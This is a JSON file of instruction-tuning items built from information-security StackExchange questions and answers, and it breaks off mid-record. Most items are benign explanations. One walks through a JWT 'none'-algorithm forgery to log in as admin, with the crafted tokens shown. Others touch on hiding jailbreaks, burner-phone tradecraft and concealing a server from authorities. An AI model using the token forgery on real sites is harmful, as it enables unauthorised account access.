    "output": "A: It's impossible to say in your specific situation. What I can say is that there's basically an arms race between the author of jailbreak detection libraries and people creating apps to hide jailbreaks. Apps like xCon attempt to beat the detection libraries. Google \"hiding jailbreak iOS 8\" (or appropriate version).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Detecting different jailbreaks\nI am using an application that shuts down and quits when it detects a jailbroken phone. \nIs it possible that this application only detects some kinds of jailbreaks and not others? Or do applications generally detect jailbreaks by the result rather than the process?",
      "answer": "It's impossible to say in your specific situation. What I can say is that there's basically an arms race between the author of jailbreak detection libraries and people creating apps to hide jailbreaks. Apps like xCon attempt to beat the detection libraries. Google \"hiding jailbreak iOS 8\" (or appropriate version)."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHaving problems with performing a JWT \"none\" algorithm attack\nI'm taking a course where I must breach a site which uses 2015 version of JWT for authentication. They gave me the test//test login information and I must login with admin.\nAfter I log in, I receive this token, and it's stored in my cookies:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.vLVv9jMkXF8YTdkkbmWfWAB9teChPPJI6t4f8ejR-8I\n\nI decoded it with jwt.io and got this header and payload:\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n\n{\n  \"username\": \"test\"\n}\n\nSo I changed the alg to none and the username to admin and used an empty string as a signature:\nheader = '{\"alg\":\"none\"\",\"typ\":\"JWT\"}'\npayload = '{\"username\":\"admin\"}'\nsignature = \"\"\ntoken = encodeBase64URL(header) + '.' + encodeBase64URL(payload) + '.' + encodeBase64URL(signature)\n\nI got this token as a result:\neyJhbGciOiJub25lIiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.\n\nI replaced my cookie with this one, and refreshed the page. But it's invalid or something because I got logged out instead of being identified as the admin user.\nWhy?",
    "context": "",
    "output": "You have a typo in your header:\nheader = '{\"alg\":\"none\"\",\"typ\":\"JWT\"}'\n\nnone has two quotes at the end.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Having problems with performing a JWT \"none\" algorithm attack\nI'm taking a course where I must breach a site which uses 2015 version of JWT for authentication. They gave me the test//test login information and I must login with admin.\nAfter I log in, I receive this token, and it's stored in my cookies:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.vLVv9jMkXF8YTdkkbmWfWAB9teChPPJI6t4f8ejR-8I\n\nI decoded it with jwt.io and got this header and payload:\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n\n{\n  \"username\": \"test\"\n}\n\nSo I changed the alg to none and the username to admin and used an empty string as a signature:\nheader = '{\"alg\":\"none\"\",\"typ\":\"JWT\"}'\npayload = '{\"username\":\"admin\"}'\nsignature = \"\"\ntoken = encodeBase64URL(header) + '.' + encodeBase64URL(payload) + '.' + encodeBase64URL(signature)\n\nI got this token as a result:\neyJhbGciOiJub25lIiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.\n\nI replaced my cookie with this one, and refreshed the page. But it's invalid or something because I got logged out instead of being identified as the admin user.\nWhy?",
      "answer": "You have a typo in your header:\nheader = '{\"alg\":\"none\"\",\"typ\":\"JWT\"}'\n\nnone has two quotes at the end."
    }
  },
  {
    "instruction": "Q: How would two people with burner phones communicate?\nAccording to Edward Snowden in this tweet...\n\nPhones used in real-world ops are disposed on a per-action, or per-call basis. Lifetimes of minutes, hours. Not days.\n\nLet's imagine for a moment that I'm Jason Bourne. I've stopped by the kiosk in Waterloo Station and picked up a PAYG mobile phone. Presumably I've used fake ID.\nAt the same time, my counterparty Jack Bauer is picking up a prepaid phone from a similar kiosk at Los Angeles International Airport.\nHow do I actually place a call to him, given that both of us have new phone numbers?",
    "context": "",
    "output": " A: Burner phone numbers as an OTP 'equivalent'\nYou can think of the \"identities\" of those phones (phone number, SIM, phone itself/IMEI) as an equivalent of one-time pad encryption - you exchange the phone numbers (multiple) over a secure channel - e.g., when meeting in person; and then they're secure and provide no useful information (for network/metadata analysis) as long as you discard them after a single use.\nIn your proposed scenario, Jack would have picked up a bunch of prepaid phone cards and given you the list of those numbers. Afterwards, if you'd need to contact him, you would call the first number on the list, have your conversation, and after that you could both discard the phones. If you'd expect a future call, then you'd turn on the phones corresponding to the second item on your lists.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How would two people with burner phones communicate?\nAccording to Edward Snowden in this tweet...\n\nPhones used in real-world ops are disposed on a per-action, or per-call basis. Lifetimes of minutes, hours. Not days.\n\nLet's imagine for a moment that I'm Jason Bourne. I've stopped by the kiosk in Waterloo Station and picked up a PAYG mobile phone. Presumably I've used fake ID.\nAt the same time, my counterparty Jack Bauer is picking up a prepaid phone from a similar kiosk at Los Angeles International Airport.\nHow do I actually place a call to him, given that both of us have new phone numbers?",
      "answer": "Burner phone numbers as an OTP 'equivalent'\nYou can think of the \"identities\" of those phones (phone number, SIM, phone itself/IMEI) as an equivalent of one-time pad encryption - you exchange the phone numbers (multiple) over a secure channel - e.g., when meeting in person; and then they're secure and provide no useful information (for network/metadata analysis) as long as you discard them after a single use.\nIn your proposed scenario, Jack would have picked up a bunch of prepaid phone cards and given you the list of those numbers. Afterwards, if you'd need to contact him, you would call the first number on the list, have your conversation, and after that you could both discard the phones. If you'd expect a future call, then you'd turn on the phones corresponding to the second item on your lists."
    }
  },
  {
    "instruction": "Please answer this question: Is there any way to make the Government not find out geolocation from the hoster?\nThe government can find servers very quickly by contacting the hoster that hosts your VPN server, and the service provider might give your IP address.\nBut what if I use torsocks ssh -d? I don't know if it's like that, but whonix gateway + port forward.",
    "context": "",
    "output": "You can use a Tor hidden service. If the SSH server is only accessible in the Tor network, there's no contact information on who hosts it, so nobody to the government to contact.\nThe security of it depends on your operation security, and on how determined is the adversary on finding you.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there any way to make the Government not find out geolocation from the hoster?\nThe government can find servers very quickly by contacting the hoster that hosts your VPN server, and the service provider might give your IP address.\nBut what if I use torsocks ssh -d? I don't know if it's like that, but whonix gateway + port forward.",
      "answer": "You can use a Tor hidden service. If the SSH server is only accessible in the Tor network, there's no contact information on who hosts it, so nobody to the government to contact.\nThe security of it depends on your operation security, and on how determined is the adversary on finding you."
    }
  },
  {
    "instruction": "Question: NMAP SSMTP Service Detection\nWhen I examined a NMAP -sV scan on a host running Exim on port 465, it uses the standard SYN scan to determine if the port is open, and then issues a Client Hello to which the server responds with a Server Hello. There is a Encryted Handshake from NMAP and Application Data from the server but nothing seems to suggest how NMAP determines what is running on the port, which is quite different than how it identifies other services like IMAP or POP3. So, how does it do it?",
    "context": "",
    "output": "Answer: It's the same as any other service just over SSL I suspect. So you might just see the encrypted part it's still the same protocol beneath the SSL layer.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "NMAP SSMTP Service Detection\nWhen I examined a NMAP -sV scan on a host running Exim on port 465, it uses the standard SYN scan to determine if the port is open, and then issues a Client Hello to which the server responds with a Server Hello. There is a Encryted Handshake from NMAP and Application Data from the server but nothing seems to suggest how NMAP determines what is running on the port, which is quite different than how it identifies other services like IMAP or POP3. So, how does it do it?",
      "answer": "It's the same as any other service just over SSL I suspect. So you might just see the encrypted part it's still the same protocol beneath the SSL layer."
    }
  },
  {
    "instruction": "Can you tell me the answer to: secure user authertication\nHere : Help understanding basic user authentication with salts and hashing\nThey explain it pretty well, but i'm still struggling to understand this one part...\n\nNow, when a user comes to log in again they submit their username and\n  password in the form. You then want to see if they are in the table so\n  you then:\n1) Look up the supplied username in your database and return the hash and\n  the salt \n2) Take the provided username and rerun the hashing function\n  using the salt obtained in 1 to do somehting like hash(salt+password\n  submit on form) \n3) If the hash generated in 2, matches the on retrieved\n  from the database in 1 then you know they provided the correct\n  password\n\nDoes the client side of the application make the stored hash(pw+salt), send it over ssl/tls to the server and then check if it matches the one stroed on server ? if so , how do we get the salt ? Is it okay to send it from server to client in plain text over ssl/tls ?\nOr do we send the password from client-side to server in plain text over ssl/tls and then generate the hash(pw+salt) on server-side whereafter we'd check if it matches ?",
    "context": "",
    "output": "answer: The client send the password to the server.\nOn registration the server creates the salt and stores it. It then computes and stores the password hash. \nOn login the client send the password again, the server looks up the salt in its own database, and computes the password hash for verification.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "secure user authertication\nHere : Help understanding basic user authentication with salts and hashing\nThey explain it pretty well, but i'm still struggling to understand this one part...\n\nNow, when a user comes to log in again they submit their username and\n  password in the form. You then want to see if they are in the table so\n  you then:\n1) Look up the supplied username in your database and return the hash and\n  the salt \n2) Take the provided username and rerun the hashing function\n  using the salt obtained in 1 to do somehting like hash(salt+password\n  submit on form) \n3) If the hash generated in 2, matches the on retrieved\n  from the database in 1 then you know they provided the correct\n  password\n\nDoes the client side of the application make the stored hash(pw+salt), send it over ssl/tls to the server and then check if it matches the one stroed on server ? if so , how do we get the salt ? Is it okay to send it from server to client in plain text over ssl/tls ?\nOr do we send the password from client-side to server in plain text over ssl/tls and then generate the hash(pw+salt) on server-side whereafter we'd check if it matches ?",
      "answer": "The client send the password to the server.\nOn registration the server creates the salt and stores it. It then computes and stores the password hash. \nOn login the client send the password again, the server looks up the salt in its own database, and computes the password hash for verification."
    }
  },
  {
    "instruction": "Answer the question below.\nDefence methods against tailgating\nThis is a follow-up question to this one: Roles to play when tailgaiting into a residential building\nHow do you protect yourself or your company against tailgaters? What is the best answer when you are asked by, let's say the delivery guy, to let you in?",
    "context": "",
    "output": "You protect yourself by politely challenging people who are trying to get in without using the controls. You simply ask to see their pass or offer to escort them to reception/security. I use the simple phrase, \"I'm sorry, I do not know who you are so I cannot just let you in. May I escort you to reception?\" If they resist, I monitor them and quietly inform security. For me, it doesn't matter if they are the CEO or a delivery person.\nThe company protects itself by \n\ninstalling physical gates that only allow one person in at a time\ncontrols that prevent the same passcard being used on the same side of the gate\nhuman monitors to detect tailgating\ntraining people to politely challenge those trying to get in without using the proper methods",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Defence methods against tailgating\nThis is a follow-up question to this one: Roles to play when tailgaiting into a residential building\nHow do you protect yourself or your company against tailgaters? What is the best answer when you are asked by, let's say the delivery guy, to let you in?",
      "answer": "You protect yourself by politely challenging people who are trying to get in without using the controls. You simply ask to see their pass or offer to escort them to reception/security. I use the simple phrase, \"I'm sorry, I do not know who you are so I cannot just let you in. May I escort you to reception?\" If they resist, I monitor them and quietly inform security. For me, it doesn't matter if they are the CEO or a delivery person.\nThe company protects itself by \n\ninstalling physical gates that only allow one person in at a time\ncontrols that prevent the same passcard being used on the same side of the gate\nhuman monitors to detect tailgating\ntraining people to politely challenge those trying to get in without using the proper methods"
    }
  },
  {
    "instruction": "Please answer this question: Anonymous FTP Risks\nIf my IIS 6.0 web server is disabled and the only other service running is FTP, what are the security risks of allowing anonymous FTP read/write, considering that a random person couldn't use any sort of php/asp shell to compromise my system?",
    "context": "",
    "output": "Depends on what files/directories you let them read/write.  If there's nothing of value in there (e.g., just benign files) they can't do much to compromise your system assuming your FTP server is fully patched and doesn't have any zero-day vulnerabilities.  However, they still could fill up your disk space (potentially crashing the system or otherwise DoSing it) if quotas aren't in place and its on the same partition as the OS.  Or they could use your system for illegal purposes (sharing copyrighted information/child pornography/etc.).\nIf you let them read/write important system directories/confidential information, they can do worse things.  I'm not a windows user; but if they know where to look they could get password hashes (the equivalent of /etc/shadow) with read permissions (and use GPUs to attempt to crack offline) or with write permissions possibly insert a hash for a password they know so they can log in as a privileged user.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Anonymous FTP Risks\nIf my IIS 6.0 web server is disabled and the only other service running is FTP, what are the security risks of allowing anonymous FTP read/write, considering that a random person couldn't use any sort of php/asp shell to compromise my system?",
      "answer": "Depends on what files/directories you let them read/write.  If there's nothing of value in there (e.g., just benign files) they can't do much to compromise your system assuming your FTP server is fully patched and doesn't have any zero-day vulnerabilities.  However, they still could fill up your disk space (potentially crashing the system or otherwise DoSing it) if quotas aren't in place and its on the same partition as the OS.  Or they could use your system for illegal purposes (sharing copyrighted information/child pornography/etc.).\nIf you let them read/write important system directories/confidential information, they can do worse things.  I'm not a windows user; but if they know where to look they could get password hashes (the equivalent of /etc/shadow) with read permissions (and use GPUs to attempt to crack offline) or with write permissions possibly insert a hash for a password they know so they can log in as a privileged user."
    }
  },
  {
    "instruction": "Answer the following question:\n\nBasic Blocks and Data Flow Analysis\nI am looking to do some Data Flow Analysis via code. I have already the code that parses a binary and disassembles it (x86/x64) and creates Basic Blocks.\nNow what I would like to do is, for any Basic Block, analyze the effect of each instruction and compose all these effects to derive information\nat basic block boundaries.\nAlso I would like to perform Variable Tracking and Live Variable Analysis. Last, CFG (Control Flow Graph) to see all these effects across basic blocks.\nIs there any available C/C+ Lib or subset of any Open Source Project that can help me achieve this?\nThanks!",
    "context": "",
    "output": "A nice framework to look at is Triton which does a good job in Dynamic Symbolic Execution. I ended up looking at the code and implementing my own solution with their same approach.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Basic Blocks and Data Flow Analysis\nI am looking to do some Data Flow Analysis via code. I have already the code that parses a binary and disassembles it (x86/x64) and creates Basic Blocks.\nNow what I would like to do is, for any Basic Block, analyze the effect of each instruction and compose all these effects to derive information\nat basic block boundaries.\nAlso I would like to perform Variable Tracking and Live Variable Analysis. Last, CFG (Control Flow Graph) to see all these effects across basic blocks.\nIs there any available C/C+ Lib or subset of any Open Source Project that can help me achieve this?\nThanks!",
      "answer": "A nice framework to look at is Triton which does a good job in Dynamic Symbolic Execution. I ended up looking at the code and implementing my own solution with their same approach."
    }
  },
  {
    "instruction": "What is the answer to this question - Why avoid shared user accounts?\nI know its best practice not to allow shared user accounts, but where is this best practice defined? Is it an ISO standard or something? What is the reasons to always create per person accounts?\n\n",
    "context": "",
    "output": "You should use separated account in all contexts (security on the top).\nAdonalsium example show you because it's required.\nThere are some rare situations where it is \"not possible\" or \"not usefull\" ... \nExamples:\n\"not possible\" (legacy protocols/applications)\n\"no relevant\" (anonymous actions)\nIf it is no possible, but you need to identify, you have to mitigate the risk adding more source informations as possible  (e.g. connection info, connection time, etc ...)\nYou can check ISO 27001 Risk Assessment Methodology, ISO 31000 Risk management as starting point to answer to your question \"Why avoid shared user accounts?\"",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why avoid shared user accounts?\nI know its best practice not to allow shared user accounts, but where is this best practice defined? Is it an ISO standard or something? What is the reasons to always create per person accounts?",
      "answer": "You should use separated account in all contexts (security on the top).\nAdonalsium example show you because it's required.\nThere are some rare situations where it is \"not possible\" or \"not usefull\" ... \nExamples:\n\"not possible\" (legacy protocols/applications)\n\"no relevant\" (anonymous actions)\nIf it is no possible, but you need to identify, you have to mitigate the risk adding more source informations as possible  (e.g. connection info, connection time, etc ...)\nYou can check ISO 27001 Risk Assessment Methodology, ISO 31000 Risk management as starting point to answer to your question \"Why avoid shared user accounts?\""
    }
  },
  {
    "instruction": "Answer the question below.\nFull disk encryption for UEFI non-OS GPT drives? (VeraCrypt)\nIs there a way to fully encrypt UEFI GPT non-system drives?\nI'd like to use the open source successor of TrueCrypt VeraCrypt.\nAlso I'm interested in whether it also works for two drives that were virtually merged into a single drive.",
    "context": "",
    "output": "1.18 supports UEFI for boot volume\nIt is better to use VeraCrypt 1.20B2 from sourceforge\nOrdinary data volumes on GPT disks work also.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Full disk encryption for UEFI non-OS GPT drives? (VeraCrypt)\nIs there a way to fully encrypt UEFI GPT non-system drives?\nI'd like to use the open source successor of TrueCrypt VeraCrypt.\nAlso I'm interested in whether it also works for two drives that were virtually merged into a single drive.",
      "answer": "1.18 supports UEFI for boot volume\nIt is better to use VeraCrypt 1.20B2 from sourceforge\nOrdinary data volumes on GPT disks work also."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow to tell if a site is securely storing passwords?\nA site I frequent has a policy to make you change your password every 90 days. That's a cool policy, but I stumbled upon an old xkcd and facepalmed myself, because lots of doxing happens on this site. It just never crossed my mind that something like this could happen to a more reputable site (silly I know). The site runs on vBulletin.\nHow can I find if the site I'm using is storing my password securely?",
    "context": "",
    "output": "A: There's no legitimate way for you to directly know if a website stores passwords in plaintext, stores them in a reversable (possibly encrypted) format, stores as mediocre hashes, or securely hashes them. One possibility is to try to recover your password using their \"forgot my password\" functionality. If they send you your password, then they're definitely storing it as plaintext or as a reversible (possibly encrypted) format. The problem with this method is that it doesn't work the other way around; if they do not send you your password, it does not mean they're not storing it as plaintext or in a reversible format.\nBottom line is: Unless you gain legitimate or illegitimate (hacking) access to their servers to see for yourself, there's really no way to tell.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to tell if a site is securely storing passwords?\nA site I frequent has a policy to make you change your password every 90 days. That's a cool policy, but I stumbled upon an old xkcd and facepalmed myself, because lots of doxing happens on this site. It just never crossed my mind that something like this could happen to a more reputable site (silly I know). The site runs on vBulletin.\nHow can I find if the site I'm using is storing my password securely?",
      "answer": "There's no legitimate way for you to directly know if a website stores passwords in plaintext, stores them in a reversable (possibly encrypted) format, stores as mediocre hashes, or securely hashes them. One possibility is to try to recover your password using their \"forgot my password\" functionality. If they send you your password, then they're definitely storing it as plaintext or as a reversible (possibly encrypted) format. The problem with this method is that it doesn't work the other way around; if they do not send you your password, it does not mean they're not storing it as plaintext or in a reversible format.\nBottom line is: Unless you gain legitimate or illegitimate (hacking) access to their servers to see for yourself, there's really no way to tell."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhy would a goal of DLP solution implementation include \"loss of mitigation\"?\nI'm studying for the CCSP exam and a practice question read: \n\nThe goals of DLP solution implementation include all of the following,\n  except: \nA. Policy enforcement\n  B. Elasticity\n  C. Data discovery\n  D. Loss of mitigation\n\nI chose D because I don't see how a DLP solution could make mitigation worse... \nAccording to the test prep book though, the answer is B because: \n\nDLP does not have anything to do with elasticity, which is the\n  capability of the environment to scale up or down according to demand.\n  All the rest are goals of DLP implementations.\n\nOK, fair enough.  I clearly see how I was wrong on the elasticity point.  But why is D not a valid answer?  I reviewed the prep material again and don't see this explained.  Can someone please elaborate?",
    "context": "",
    "output": "This was probably a typo. Data Loss mitigation is obviously a goal of DLP. Elasticity, as you said, is not a goal of DLP.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why would a goal of DLP solution implementation include \"loss of mitigation\"?\nI'm studying for the CCSP exam and a practice question read: \n\nThe goals of DLP solution implementation include all of the following,\n  except: \nA. Policy enforcement\n  B. Elasticity\n  C. Data discovery\n  D. Loss of mitigation\n\nI chose D because I don't see how a DLP solution could make mitigation worse... \nAccording to the test prep book though, the answer is B because: \n\nDLP does not have anything to do with elasticity, which is the\n  capability of the environment to scale up or down according to demand.\n  All the rest are goals of DLP implementations.\n\nOK, fair enough.  I clearly see how I was wrong on the elasticity point.  But why is D not a valid answer?  I reviewed the prep material again and don't see this explained.  Can someone please elaborate?",
      "answer": "This was probably a typo. Data Loss mitigation is obviously a goal of DLP. Elasticity, as you said, is not a goal of DLP."
    }
  },
  {
    "instruction": "Are there Yubikey-like TOTP hardware tokens without additional software?\nI am looking for a way to replace my phone as a 2FA method. U2F is not universally supported. Most services that I use support TOTP (Google Authenticator), and so I thought the Yubikey would support loading the TOTP secret and, upon press of a button, somehow detect the web site I am on, generate the code, and enter it, without additional software involved. Apparently, this does not work. But could it? Or is there hardware that supports this use case?",
    "context": "",
    "output": "The hardware token detects the website you're on, generates an appropriate code, and submits it directly without the user typing anything? That sounds a lot like u2f.\nThe reason why you don't see this offered is the same reason why only a few sites support u2f: it would require the browser to interact directly with the hardware token, and at the moment only Google Chrome is able to connect to USB devices. Other vendors don't see it as an important feature to include. Sad, because it solves phishing more or less entirely.\nSo no, this doesn't exist as you describe if you're not willing to use u2f. There's stuff like LastPass which can do something of what you ask, but that's a browser extension not a hardware token.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are there Yubikey-like TOTP hardware tokens without additional software?\nI am looking for a way to replace my phone as a 2FA method. U2F is not universally supported. Most services that I use support TOTP (Google Authenticator), and so I thought the Yubikey would support loading the TOTP secret and, upon press of a button, somehow detect the web site I am on, generate the code, and enter it, without additional software involved. Apparently, this does not work. But could it? Or is there hardware that supports this use case?",
      "answer": "The hardware token detects the website you're on, generates an appropriate code, and submits it directly without the user typing anything? That sounds a lot like u2f.\nThe reason why you don't see this offered is the same reason why only a few sites support u2f: it would require the browser to interact directly with the hardware token, and at the moment only Google Chrome is able to connect to USB devices. Other vendors don't see it as an important feature to include. Sad, because it solves phishing more or less entirely.\nSo no, this doesn't exist as you describe if you're not willing to use u2f. There's stuff like LastPass which can do something of what you ask, but that's a browser extension not a hardware token."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhere are page permissions stored in an ELF binary?\nPerhaps I am misunderstanding how this works, but to my knowledge ELF binaries can either have NX protections for the stack, or not. What I am assuming is that there is a place in the binary that spells this out, but I'm not sure exactly where this information is stored. \nHow do you figure out the page permissions for an ELF binary from a disassembly?",
    "context": "",
    "output": "Permissions are in the p_flags member of the program header.\n       typedef struct {\n           uint32_t   p_type;\n           Elf32_Off  p_offset;\n           Elf32_Addr p_vaddr;\n           Elf32_Addr p_paddr;\n           uint32_t   p_filesz;\n           uint32_t   p_memsz;\n           uint32_t   p_flags;\n           uint32_t   p_align;\n       } Elf32_Phdr;\n\n       p_flags     This member holds a bit mask of flags relevant to the\n                   segment:\n\n                   PF_X   An executable segment.\n                   PF_W   A writable segment.\n                   PF_R   A readable segment.\n\n                   A text segment commonly has the flags PF_X and PF_R.  A\n                   data segment commonly has PF_X, PF_W and PF_R.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Where are page permissions stored in an ELF binary?\nPerhaps I am misunderstanding how this works, but to my knowledge ELF binaries can either have NX protections for the stack, or not. What I am assuming is that there is a place in the binary that spells this out, but I'm not sure exactly where this information is stored. \nHow do you figure out the page permissions for an ELF binary from a disassembly?",
      "answer": "Permissions are in the p_flags member of the program header.\n       typedef struct {\n           uint32_t   p_type;\n           Elf32_Off  p_offset;\n           Elf32_Addr p_vaddr;\n           Elf32_Addr p_paddr;\n           uint32_t   p_filesz;\n           uint32_t   p_memsz;\n           uint32_t   p_flags;\n           uint32_t   p_align;\n       } Elf32_Phdr;\n\n       p_flags     This member holds a bit mask of flags relevant to the\n                   segment:\n\n                   PF_X   An executable segment.\n                   PF_W   A writable segment.\n                   PF_R   A readable segment.\n\n                   A text segment commonly has the flags PF_X and PF_R.  A\n                   data segment commonly has PF_X, PF_W and PF_R."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Are multiple network interface still recommended in a virtualized world?\nBefore the virtualization era, it was recommended to have several network card on a physical server :\n\n1 for production dedicated network (only application's stream like\nhttp, SQL*NET, ...)\n1 for administration network (ssh, monitoring,\n...)\n1 for backup network (netbackup, ...)\n\nThese recommendations had security and ops advantages:\nnetwork port for administration or backup purpose are not available on production facing network, dedicated bandwidth for backup that doesn't impact production bandwidth, ...\nWith virtualized servers and network are multiple network card/interface still recommended  ?",
    "context": "",
    "output": "answer: It depends on your security goals. Separate interfaces have been used not only for the advantages you stated, but also to keep the dedicated networks, storage and backup networks, and the administration networks logically segregated. Just because an infrastructure is virtualized doesn't mean that the need for network segregation goes away. \nIf you lump all these networks together into one you are no longer able to enforce specific security rules for each, so if you have a security requirement to keep these networks separate before virtualization then you need to keep them separated after virtualization.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are multiple network interface still recommended in a virtualized world?\nBefore the virtualization era, it was recommended to have several network card on a physical server :\n\n1 for production dedicated network (only application's stream like\nhttp, SQL*NET, ...)\n1 for administration network (ssh, monitoring,\n...)\n1 for backup network (netbackup, ...)\n\nThese recommendations had security and ops advantages:\nnetwork port for administration or backup purpose are not available on production facing network, dedicated bandwidth for backup that doesn't impact production bandwidth, ...\nWith virtualized servers and network are multiple network card/interface still recommended  ?",
      "answer": "It depends on your security goals. Separate interfaces have been used not only for the advantages you stated, but also to keep the dedicated networks, storage and backup networks, and the administration networks logically segregated. Just because an infrastructure is virtualized doesn't mean that the need for network segregation goes away. \nIf you lump all these networks together into one you are no longer able to enforce specific security rules for each, so if you have a security requirement to keep these networks separate before virtualization then you need to keep them separated after virtualization."
    }
  },
  {
    "instruction": "Question: Debian 8 and few questions about Graphical Firewall?\nI have installed Debian 8 today, and so far so good. What I want to achieve now is to install firewall but can't find Firestarter in repos (discontinued ?). So, I have installed a GUFW and set it up. \nAfter some time running GUFW, it spits out some errors and the Graphical Interface is closed. Because of that I'm afraid that my firewall might not work correctly. Is there any way I can test or check if my firewall is working correctly as it should?",
    "context": "",
    "output": "Answer: For the set of firewall rules that you have created, you can create tests for each of those rules. I accomplish this in organizational settings by using tools such as hping or scapy. \nIf you are familiar with the concept of unit tests, it works the same way. I run a listener on the protected host and send packets to it that have been crafted to test each rule in the rule set. In this way, you can test the effect of changes that you make, and ensure that your expectations are met at any point in time.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Debian 8 and few questions about Graphical Firewall?\nI have installed Debian 8 today, and so far so good. What I want to achieve now is to install firewall but can't find Firestarter in repos (discontinued ?). So, I have installed a GUFW and set it up. \nAfter some time running GUFW, it spits out some errors and the Graphical Interface is closed. Because of that I'm afraid that my firewall might not work correctly. Is there any way I can test or check if my firewall is working correctly as it should?",
      "answer": "For the set of firewall rules that you have created, you can create tests for each of those rules. I accomplish this in organizational settings by using tools such as hping or scapy. \nIf you are familiar with the concept of unit tests, it works the same way. I run a listener on the protected host and send packets to it that have been crafted to test each rule in the rule set. In this way, you can test the effect of changes that you make, and ensure that your expectations are met at any point in time."
    }
  },
  {
    "instruction": "Answer the question below.\nHow does DNS over TLS prevent your ISP from seeing the websites you visit?\nFor example, I'm using DNS over TLS in Android Pie. This happens:\n\nI visit a website (google.com).\nI send a DNS query to the DNS server, and the response is the IP address of google.com. The ISP knows I contacted the DNS server, but doesn't know the query or the response.\nNext, I connect to the IP of google.com. The ISP knows I contacted google.com's IP now.\n\nAnd yet, news articles (and some questions in this site) says that the ISP won't see the websites you visit if you use DNS over TLS. Am I missing something here?",
    "context": "",
    "output": "It doesn't. DNS over TLS is not designed to keep your privacy from ISP. Like HTTP,  DNS is vulnerable to MITM. DNS over TLS provides the same level of security as HTTPS.\nAs DNS over TLS is encrypted, your ISP can't see the domains you query for but they don't have to. TLS uses Server Name Indication, a TLS extension which appears on the outside of HTTP host header. SNI field contains the domain name of the server you want to talk to. Once you visit that site, your ISP can see that unless you use a VPN.\nCloudfare has recently released support support for encrypted SNI(ESNI) for the websites that are hosted by Cloudfare. This actually prevents your ISP from seeing the site you visit provided you are also using DNS over TLS. But for ESNI to work browsers have to natively support it. Mozilla landed support for ESNI in Firefox Nightly, so you can now browse Cloudflare websites without leaking the plaintext SNI TLS extension to on-path observers ISPs, coffee-shop owners, firewalls.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does DNS over TLS prevent your ISP from seeing the websites you visit?\nFor example, I'm using DNS over TLS in Android Pie. This happens:\n\nI visit a website (google.com).\nI send a DNS query to the DNS server, and the response is the IP address of google.com. The ISP knows I contacted the DNS server, but doesn't know the query or the response.\nNext, I connect to the IP of google.com. The ISP knows I contacted google.com's IP now.\n\nAnd yet, news articles (and some questions in this site) says that the ISP won't see the websites you visit if you use DNS over TLS. Am I missing something here?",
      "answer": "It doesn't. DNS over TLS is not designed to keep your privacy from ISP. Like HTTP,  DNS is vulnerable to MITM. DNS over TLS provides the same level of security as HTTPS.\nAs DNS over TLS is encrypted, your ISP can't see the domains you query for but they don't have to. TLS uses Server Name Indication, a TLS extension which appears on the outside of HTTP host header. SNI field contains the domain name of the server you want to talk to. Once you visit that site, your ISP can see that unless you use a VPN.\nCloudfare has recently released support support for encrypted SNI(ESNI) for the websites that are hosted by Cloudfare. This actually prevents your ISP from seeing the site you visit provided you are also using DNS over TLS. But for ESNI to work browsers have to natively support it. Mozilla landed support for ESNI in Firefox Nightly, so you can now browse Cloudflare websites without leaking the plaintext SNI TLS extension to on-path observers ISPs, coffee-shop owners, firewalls."
    }
  },
  {
    "instruction": "What is the answer to this question - How exactly should I interpret the term \"Hybrid Cloud\"?\nThe CISSP CBK definition says that a hybrid could is a mix of public and private.\nBut what exactly does it mean?\n\nIs it more a conceptual idea:If you use both a public and a private your company is a hybrid user\n\nor\n\nYou have a single cloud with different logical access and permissions for public usage and private (within the company)\n\nor\nSomething else?\n\n",
    "context": "",
    "output": "Look at it from a service perspective instead of from a \"cloud\" perspective (there is no such thing as a \"cloud\").\nIf a service resides partially on a privately held network as well as on a publicly held network, then it's a \"hybrid\". \nFor example, I use a security service where I deploy multiple servers within my own network (private \"cloud\") and the data from those collectors is sent to the vendor's network (public \"cloud\") for processing and correlation. That's a \"hybrid cloud\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
